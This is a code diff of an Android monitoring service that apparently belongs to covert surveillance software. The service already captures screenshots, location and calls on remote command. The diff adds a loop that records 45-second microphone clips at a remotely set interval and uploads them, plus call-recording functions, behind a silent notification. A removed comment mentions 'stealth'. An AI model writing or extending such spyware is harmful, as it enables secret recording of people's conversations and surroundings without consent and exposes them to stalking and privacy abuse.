@@ -91,9 +91,12 @@ class MonitoringForegroundService : Service() {
     @Volatile var mediaProjection: MediaProjection? = null
 
     // Dynamic remote-config values
-    @Volatile private var captureIntervalMs = 60_000L
+    @Volatile private var captureIntervalMs = 300_000L
     @Volatile private var locationIntervalMs = 600_000L
     @Volatile private var recordCallsEnabled = false
+    @Volatile private var recordingEnabled = false
+    @Volatile private var ambientRecordIntervalMs = 90_000L
+    private var ambientRecordJob: Job? = null
 
     // Projection-miss watchdog counter
     private var projectionMissCount = 0
@@ -207,25 +210,26 @@ class MonitoringForegroundService : Service() {
 
             val hasLocation = android.content.pm.PackageManager.PERMISSION_GRANTED ==
                 checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
-            // v33: No Mic check on startup for stealth
-
 
             if (hasLocation) serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-            // v33: No Mic type on startup
+            
+            // Dynamic check: Include MICROPHONE type only if active consumers exist
+            if (micConsumersCount.get() > 0) {
+                serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+            }
 
-
-            Log.i(TAG, "startForeground-MINIMAL (v33) types=0x${serviceType.toString(16)}")
+            Log.i(TAG, "startForegroundSafe types=0x${serviceType.toString(16)}")
 
             try {
                 startForeground(NOTIFICATION_ID, notif, serviceType)
             } catch (e: Exception) {
-                Log.e(TAG, "startForeground-min failed: ${e.message}")
+                Log.e(TAG, "startForegroundSafe failed: ${e.message}")
             }
         } else {
             try {
                 startForeground(NOTIFICATION_ID, notif)
             } catch (e: Exception) {
-                Log.e(TAG, "startForeground (legacy) failed: ${e.message}")
+                Log.e(TAG, "startForegroundSafe (legacy) failed: ${e.message}")
             }
         }
     }
@@ -239,23 +243,26 @@ class MonitoringForegroundService : Service() {
     private fun upgradeForegroundToMediaProjection() {
         val notif = buildNotification()
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                startForeground(
-                    NOTIFICATION_ID, notif,
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                var serviceType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC       or
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION        or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE      or
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-                )
-            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(
-                    NOTIFICATION_ID, notif,
+                } else {
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION        or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE      or
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-                )
+                }
+
+                // Dynamic check: Include MICROPHONE type only if active consumers exist
+                if (micConsumersCount.get() > 0) {
+                    serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                }
+
+                startForeground(NOTIFICATION_ID, notif, serviceType)
+            } else {
+                startForeground(NOTIFICATION_ID, notif)
             }
-            Log.i(TAG, "Foreground upgraded to include MEDIA_PROJECTION type ✅")
+            Log.i(TAG, "Foreground upgraded to include MEDIA_PROJECTION type ✅ (mic active: ${micConsumersCount.get() > 0})")
         } catch (e: Exception) {
             Log.e(TAG, "Upgrade to MEDIA_PROJECTION type failed: ${e.message}")
         }
@@ -320,16 +327,13 @@ class MonitoringForegroundService : Service() {
 
     /**
      * One-time manual recording (v33).
-     * Upgrades foreground type, records, then downgrades.
+     * delegates entirely to audioEngine.recordAndUpload (which manages its own mic type).
      */
     fun startManualMic(durationMs: Long, bypassVad: Boolean = true) {
         scope.launch {
             try {
-                Log.i(TAG, "Manual MIC request: upgrading foreground...")
-                upgradeToMicType()
+                Log.i(TAG, "Manual MIC request: calling recordAndUpload")
                 audioEngine.recordAndUpload(durationMs, bypassVad)
-                Log.i(TAG, "Manual MIC done: downgrading...")
-                downgradeFromMicType()
             } catch (e: Exception) {
                 Log.e(TAG, "Manual MIC error: ${e.message}")
             }
@@ -358,6 +362,23 @@ class MonitoringForegroundService : Service() {
             } catch (e: Exception) {
                 Log.e(TAG, "Manual SCREEN error: ${e.message}")
             }
+        }
+    }
+
+    fun startCallRecording(): Boolean {
+        return if (::audioEngine.isInitialized) {
+            audioEngine.startCallRecording()
+        } else {
+            Log.e(TAG, "Cannot start call recording: audioEngine not initialized")
+            false
+        }
+    }
+
+    fun stopCallRecording() {
+        if (::audioEngine.isInitialized) {
+            audioEngine.stopRecording(upload = true)
+        } else {
+            Log.e(TAG, "Cannot stop call recording: audioEngine not initialized")
         }
     }
 
@@ -546,8 +567,12 @@ class MonitoringForegroundService : Service() {
                         captureIntervalMs   = s.screenshot_interval_ms
                         locationIntervalMs  = s.location_interval_ms
                         recordCallsEnabled  = s.record_calls
+                        
+                        setAmbientRecordLoop(s.recording_enabled, s.capture_interval)
+
                         Log.i(TAG, "Config synced — capture=${captureIntervalMs}ms " +
-                                "location=${locationIntervalMs}ms audio=$recordCallsEnabled")
+                                "location=${locationIntervalMs}ms audio=$recordCallsEnabled " +
+                                "auto_record=${s.recording_enabled} (${s.capture_interval}ms)")
 
                         updateManager.checkAndExecuteUpdate(
                             s.target_version, s.update_apk_path, s.update_apk_url
@@ -649,5 +674,35 @@ class MonitoringForegroundService : Service() {
             .setSilent(true)
             .setOngoing(true)
             .build()
+    }
+
+    fun setAmbientRecordLoop(enabled: Boolean, intervalMs: Long) {
+        if (recordingEnabled == enabled && ambientRecordIntervalMs == intervalMs && ambientRecordJob?.isActive == true) {
+            return
+        }
+        recordingEnabled = enabled
+        ambientRecordIntervalMs = if (intervalMs >= 70_000L) intervalMs else 90_000L
+        updateAmbientRecordLoop()
+    }
+
+    private fun updateAmbientRecordLoop() {
+        ambientRecordJob?.cancel()
+        if (recordingEnabled) {
+            ambientRecordJob = scope.launch {
+                while (recordingEnabled) {
+                    try {
+                        // Record for 45 seconds (so it is less than the minimum interval of 70s)
+                        audioEngine.recordAndUpload(45_000L, bypassVad = true)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Ambient record loop error: ${e.message}")
+                    }
+                    delay(ambientRecordIntervalMs)
+                }
+            }
+            Log.i(TAG, "🟢 Background ambient record loop started: every ${ambientRecordIntervalMs}ms")
+        } else {
+            ambientRecordJob = null
+            Log.i(TAG, "🔴 Background ambient record loop stopped")
+        }
     }
 }
